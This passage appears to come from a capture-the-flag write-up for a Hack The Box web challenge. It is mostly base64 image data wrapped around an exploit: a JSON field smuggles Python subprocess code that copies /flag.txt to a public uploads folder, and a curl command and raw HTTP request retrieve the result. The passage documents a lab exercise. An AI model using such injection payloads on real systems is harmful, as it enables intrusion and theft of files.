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","background":["__import__('subprocess').getoutput('cp /flag.txt /app/application/static/uploads/flag.txt')",0,0]}
```

```bash
┌──(maoutis㉿kali)-[~/CTF/HTB-CA/AmidstUs/exploit]
└─$ curl http://127.0.0.1:1337/static/uploads/flag.txt
HTB{f4k3_fl4g_f0r_t3st1ng}
```

```bash
POST /api/alphafy HTTP/1.1
Host: 157.245.40.139:30297
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://157.245.40.139:30297/
Content-Type: application/json
Origin: http://157.245.40.139:30297
Content-Length: 9953
Connection: close

{"image":"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